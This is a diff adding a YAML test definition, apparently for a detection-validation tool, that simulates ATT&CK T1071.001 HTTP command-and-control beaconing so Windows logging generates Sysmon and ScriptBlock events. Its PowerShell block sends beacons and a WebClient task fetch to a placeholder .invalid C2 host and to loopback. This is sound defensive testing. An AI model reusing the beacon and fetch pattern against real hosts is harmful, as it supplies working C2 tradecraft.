@@ -1,0 +1,51 @@
+id: T1071.001
+name: Application Layer Protocol — Web Protocols
+description: Simulates C2 beacon over HTTP/HTTPS using PowerShell Invoke-WebRequest and .NET WebClient — attempts HTTP GET beacons to a non-existent .invalid TLD C2 host (RFC 2606 reserved, guaranteed DNS failure) and loopback fallback. Generates Sysmon EID 3 (NetworkConnect from PowerShell), EID 22 (DNSEvent for C2 hostname resolution attempt), and EID 4104 (ScriptBlock with Invoke-WebRequest). The pattern of repeated HTTP beacons with short intervals from powershell.exe is a high-confidence C2 detection rule in all major SIEMs. All targets use .invalid TLD or 127.0.0.1 — no real outbound C2 traffic.
+tactic: command-and-control
+technique_id: T1071.001
+platform: windows
+phase: attack
+elevation_required: false
+expected_events:
+  - "Sysmon 3 (NetworkConnect — HTTP beacon attempt from PowerShell to lognojutsu-c2.invalid)"
+  - "4104 (PowerShell ScriptBlock — Invoke-WebRequest C2 beacon simulation)"
+  - "Sysmon 22 (DNSEvent — DNS resolution attempt for lognojutsu-c2.invalid C2 hostname)"
+tags:
+  - command-and-control
+  - no-prereqs
+executor:
+  type: powershell
+  command: |-
+    Write-Host "[T1071.001] Application Layer Protocol: Web Protocols — C2 beacon simulation"
+
+    # Method 1: Invoke-WebRequest HTTP GET beacon — .invalid TLD (Sysmon EID 3 + EID 22 + EID 4104)
+    Write-Host "--- Method 1: HTTP GET beacon to .invalid C2 host (Sysmon EID 3 + EID 22) ---"
+    try {
+        Invoke-WebRequest -Uri "http://lognojutsu-c2.invalid/beacon" -Method GET -TimeoutSec 3 -ErrorAction Stop
+    } catch {
+        Write-Host "Beacon failed as expected (target non-existent): $($_.Exception.Message)"
+        Write-Host "Sysmon EID 3 + DNS EID 22 generated for connection attempt regardless."
+    }
+    Start-Sleep -Seconds 2
+
+    # Method 2: Loopback fallback beacon — simulates C2 failover to local handler (Sysmon EID 3)
+    Write-Host "--- Method 2: Loopback fallback beacon (Sysmon EID 3) ---"
+    try {
+        Invoke-WebRequest -Uri "http://127.0.0.1:9999/c2/check-in" -TimeoutSec 2 -ErrorAction Stop
+    } catch {
+        Write-Host "Loopback beacon failed as expected (no listener on port 9999): $($_.Exception.Message)"
+        Write-Host "Sysmon EID 3 generated for loopback connection attempt."
+    }
+    Start-Sleep -Seconds 2
+
+    # Method 3: .NET WebClient API beacon — alternative HTTP C2 pattern (EID 4104)
+    Write-Host "--- Method 3: WebClient API beacon — alternative C2 transport (EID 4104) ---"
+    try {
+        (New-Object System.Net.WebClient).DownloadString("http://lognojutsu-c2.invalid/tasks")
+    } catch {
+        Write-Host "WebClient API beacon failed as expected: $($_.Exception.Message)"
+        Write-Host "EID 4104 ScriptBlock logged for WebClient usage."
+    }
+
+    Write-Host "[T1071.001] Complete. Sysmon EID 3 + EID 22 + EID 4104 generated."
+cleanup: ""
